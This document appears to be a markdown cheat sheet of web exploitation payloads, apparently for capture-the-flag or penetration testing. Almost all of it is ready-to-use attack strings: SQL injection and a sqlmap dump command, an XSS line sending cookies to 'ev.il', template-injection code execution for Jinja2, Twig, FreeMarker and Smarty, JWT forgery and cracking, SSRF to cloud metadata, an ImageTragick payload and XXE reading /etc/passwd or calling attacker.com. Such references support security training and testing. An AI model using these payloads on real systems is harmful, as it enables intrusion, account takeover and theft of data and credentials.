# Web Exploitation Knowledge

## SQL Injection (SQLi)
### Detection
- `' OR '1'='1`, `' OR 1=1--`, `' UNION SELECT NULL--`
- Time-based: `' OR SLEEP(5)--` (MySQL), `' WAITFOR DELAY '0:0:5'--` (MSSQL)
- Error-based: `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--`

### Union-Based
- Determine column count: `ORDER BY 1--` increment until error
- `UNION SELECT 1,2,3...--` to find output positions
- Extract data: `UNION SELECT 1,table_name,3 FROM information_schema.tables--`

### Blind SQLi
- Boolean: `' AND (SELECT SUBSTRING(password,1,1) FROM users)='a`
- Time-based: `' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--`
- Automate with sqlmap: `sqlmap -u "http://target/page?id=1" --batch --dump`

### NoSQL Injection (MongoDB)
- `' || '1'=='1`, `' || 1==1//`
- JSON injection: `{"$gt": ""}` for login bypass
- `$ne`, `$regex`, `$where` operators

## Cross-Site Scripting (XSS)
### Reflected
- `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
- Polyglots: `" onmouseover="alert(1)"` in attribute context

### Stored
- Comment fields, profiles, message boards
- Persistent payload; steal cookies: `document.location='https://ev.il/?c='+document.cookie`

### DOM-based
- `document.write(location.hash.substring(1))`
- `eval(location.hash.substring(1))`

### CSP Bypass
- `script-src 'self'` -> same-origin JSONP endpoints
- `script-src 'unsafe-inline'` -> inline scripts allowed
- Base tag injection: `<base href="https://attacker.com/">`

## Server-Side Template Injection (SSTI)
### Jinja2 (Python/Flask)
- Testing: `{{7*7}}` -> 49, `{{config}}` -> app config
- RCE: `{{''.__class__.__mro__[1].__subclasses__()}}` find `os` module
- `{{''.__class__.__mro__[2].__subclasses__()[X]('ls', shell=True, stdout=-1).communicate()}}`

### Twig (PHP)
- `{{_self.env.registerUndefinedFilterCallback("exec")}}`
- `{{_self.env.getFilter("id")}}`

### FreeMarker (Java)
- `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }`

### Smarty (PHP)
- `{system('id')}`, `{exec('id')}`

## JSON Web Tokens (JWT)
### Algorithm Confusion
- Change `alg` from `RS256` to `HS256` -> server uses public key as HMAC secret
- Tool: `jwt_tool` or `pyjwt` with `algorithms=["HS256"]`

### Weak Secret
- Cracking: `john jwt.txt --wordlist=rockyou.txt`
- Tool: `jwt-cracker`, `hashcat -m 16500`

### "none" Algorithm
- Set `"alg": "none"` -> signature omitted
- Must accept `alg: "None"`, `alg: "none"`, `alg: "NONE"`

### Kid Injection
- `"kid": "../../../dev/null"` -> use null key
- `"kid": "file:///etc/passwd"` -> path traversal

## SSRF (Server-Side Request Forgery)
### Bypasses
- `127.0.0.1`, `0.0.0.0`, `[::]`, `localhost`
- DNS rebinding: `1e100victim.com` (round-robin to 127.0.0.1)
- URL parser confusion: `http://evil.com@127.0.0.1`
- Short URLs: `http://0/`, `http://2130706433/` (integer IP)

### Cloud Metadata
- AWS: `http://169.254.169.254/latest/meta-data/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`

## File Upload
### Extension Filter Bypass
- `file.php.jpg`, `file.php.`, `file.php%00.jpg`
- `.phtml`, `.php5`, `.shtml`, `.cgi`
- Content-Type: `image/jpeg`, magic bytes at file start

### ImageTragick (ImageMagick)
- MVG file with: `push graphic-context; viewbox 0 0 1 1; image over 0,0 0,0 'https://attacker.com/'; pop graphic-context`

## GraphQL
- Introspection: `{"query": "{ __schema { types { name fields { name } } } }"}`
- Batch queries for rate-limit bypass
- `__typename` for injection detection

## OAuth / OIDC
- CSRF: `state` parameter missing -> attacker initiates auth flow
- Redirect URI manipulation: `https://app.com/redirect?url=https://evil.com`
- Token interception via referer header

## XXE (XML External Entity)
### In-band
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### Out-of-band
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/data"> %xxe;]>
```

## Web Proxies & Automation
- Burp Suite: intercept, repeater, intruder, decoder
- `curl` for quick testing: `-v`, `-X`, `-d`, `-H`, `-b`, `-c`
- `ffuf` for fuzzing: `ffuf -u "http://target/FUZZ" -w wordlist.txt`
- `gobuster` for directory/parameter discovery
